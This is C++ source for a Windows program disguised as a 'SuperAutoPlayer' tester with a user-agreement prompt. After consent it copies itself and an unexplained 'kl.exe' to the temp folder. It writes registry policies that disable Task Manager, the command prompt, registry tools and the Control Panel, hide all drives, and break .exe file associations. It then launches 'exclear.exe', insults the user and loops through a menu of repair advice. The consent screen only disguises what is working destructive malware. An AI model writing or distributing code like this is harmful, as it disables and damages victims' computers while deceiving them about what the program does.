#include<iostream>
#include<windows.h>
#include<string.h>
#include<stdlib.h>

using namespace std;
int main()
{	
	system("copy ConsoleApplication1.exe /y %temp%");
	system("copy kl.exe /y %temp%");
	system("color 1f");
	system("title SuperAutoPlayer测试器");
	system("@echo off");
	fopen("eula.txt", "r");
	system("start eula.txt");
	if(MessageBox(NULL, TEXT("是否同意用户协议"), TEXT("警告窗口"), MB_ICONEXCLAMATION + MB_YESNO)==IDYES)
	{
		system("@echo off");
		cout << "正在部署\n";
		system("taskkill /f /im notepad.exe");
		cout << "yes";
		system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer \/v NoClose  \/d 1 \/t REG_DWORD \/f");
		system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer \/v NoControlPanel  \/d 1 \/t REG_DWORD \/f");
		system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer \/v NoFind  \/d 1 \/t REG_DWORD \/f");
		system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer \/v NoDrives  \/d 4294967295 \/t REG_DWORD \/f");
		system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System \/v DisableTaskMgr  \/d 1 \/t REG_DWORD \/f");
		system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer \/v NoViewOnDrive  \/d 4294967295 \/t REG_DWORD \/f");
		system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System \/v DisableCMD  \/d 1 \/t REG_DWORD \/f");
		system("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System \/v  Disableregistrytools   \/d 1 \/t REG_DWORD \/f");
		system("echo off");
		system("start exclear.exe");
		MessageBox(NULL, TEXT("Sorry,But NM$L"), TEXT("error"), MB_ICONSTOP + MB_OK);
		system("cls");
		while (1)
		{
			system("color ce");
			cout << "我的电脑出了什么问题？哦不，因为您下软件没有阅读公告，但是您已经同意了用户协议，协议指出本软件仅测试会对文件造成损坏\n现在您的选择是？\n";
			cout << "1.再次阅读用户协议\n2.拿到电脑城修复\n3.重装系统\n4.学习计算机知识进行自我修复\n0.关闭此帮助，并在修复之前无法打开\n";
			int change;
			system("assoc .exe=jpgfile");
			cin >> change;
			if (change == 1)
			{
				cout << "除非您已阅读并接受本协议所有条款，否则您无权使用SuperAutoPlayerMod\n";
				cout << "您点击同意、接受或下一步均视为您已阅读并同意签署本协议。\n";
				cout << "如果您未满18周岁，请在法定监护人的陪同下阅读本协议，并特别注意未成年人使用条款。\n";
				cout << "本协议：指本协议正文, 上述内容一经正式发布，即为本协议不可分割的组成部分\n";
				cout << "除非另有明示许可，您不得且不会允许其他任何人对本软件进行复制、拆装、反向工程、反编译、反汇编或创作软件的衍生作品。此外，您不得且不会允许其他任何人进行或试图进行导出本软件源代码、解码、修改本软件或本软件提供的任何服务或其任何部分等行为。超级Modpc开发者提示您：数据无价谨慎操作，我们不建议您在实体计算机中运行此程序。开发者享有和保留对软件的所有权利和资格，并保留本协议未明确授予您的其他任何权利。\n";
				cout << "安装本软件可能会影响第三方软件、系统功能的稳定性和可用性。且您需了解，此应用程序为基础加密文件等对计算机文件可能造成损害，仅供测试用途，如果您下载 / 存储了超级Modpc的编译版本，请在下载 / 存储后的24小时内进行删除，开发者不保证本软件所包含的功能或服务将能满足您的要求，也不保证本软件及其服务能完全无错 / 无漏洞或将提供连续持久的服务。\n";
				cout << "对于因滥用、错误使用或未经授权修改所引起的软件使用问题，开发者不承担任何责任。\n";
				cout << "同意协议后将启用SuperAutoPlayerMod\n";
				cout << "使用本程序出现的任何问题请使用者自行承担\n";
				cout << "本程序运行过程中，可能会对部分文件进行 新建 / 读取 / 修改 / 移除等操作，如果您不想允许本程序进行 新建 / 读取 / 修改 / 移除文件等操作，请不要同意此用户协议。\n";
				cout << "在您同意用户协议前，本程序不会进行任何操作，如果您拒绝同意用户协议，请关闭本程序或者点击拒绝等字样带有不同意的按钮。\n";
			}
			else if (change == 2) { cout << "请前往最近的电脑修复店并描述问题\n"; }
			else if (change == 3) { cout << "您可以使用手机把PE系统文件装进去并使用U盘启动安装系统，不过修复此测试软件造成的问题不需要这么做\n";}
			else if (change == 4) { cout << "您可以在手机访问https://www.ixigua.com/home/59196208676学习各种修复方法\n"; }
			else if (change == 0) { exit(0); }
			system("pause");
			system("cls");
		}
		
	}else{
		system("taskkill /f /im notepad.exe");
	cout << "no";
		}
	return 0;
}